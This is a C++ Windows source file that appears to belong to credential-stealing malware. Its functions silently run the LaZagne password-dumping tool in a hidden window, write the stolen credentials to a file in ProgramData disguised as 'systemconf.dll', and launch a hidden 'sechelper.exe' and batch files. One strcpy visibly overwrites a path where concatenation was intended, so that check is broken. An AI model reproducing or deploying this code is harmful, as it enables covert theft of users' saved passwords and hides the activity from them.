#include <windows.h>
#include "FileHandler.h"

BOOL fileExists(LPCTSTR szPath) {
    DWORD dwAttrib = GetFileAttributes(szPath); 
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)); 
}

void runBatFile(std::string pathLocation){
    char commandCall[255]; 
    strcpy(commandCall, "/C ");
    strcat(commandCall, "call \"");
    strcat(commandCall, pathLocation.c_str());
    strcat(commandCall, "\"");
    ShellExecute(0, "open", "cmd.exe", commandCall, 0, SW_HIDE);
}

void runLazagne(){
    char fileName[255];
    strcpy(fileName, getExecutablePath().c_str());
    strcpy(fileName, "\\lazagne.exe");
    
    char commandCall[255]; 
    strcpy(commandCall, "/C ");
    strcat(commandCall, "start /b \"");
    strcat(commandCall, getExecutablePath().c_str());
    strcat(commandCall, "\\\" lazagne.exe all >> C:\\ProgramData\\SecurityHelper\\systemconf.dll");
    if(fileExists(fileName))
        ShellExecute(0, "open", "cmd.exe", commandCall, getExecutablePath().c_str(), SW_HIDE);
}

void runSechelper(){
    if(fileExists("C:\\ProgramData\\SecurityHelper\\sechelper.exe")){
        ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\ProgramData\\SecurityHelper\\\" sechelper.exe\0", "C:\\ProgramData\\SecurityHelper\\\0", SW_HIDE);
    }    
}

std::string getExecutablePath(){
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    std::string::size_type pos = std::string( buffer ).find_last_of( "\\/" );
    return std::string( buffer ).substr( 0, pos);
}

std::string getExecutableFullPath(){
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    return std::string( buffer );
}
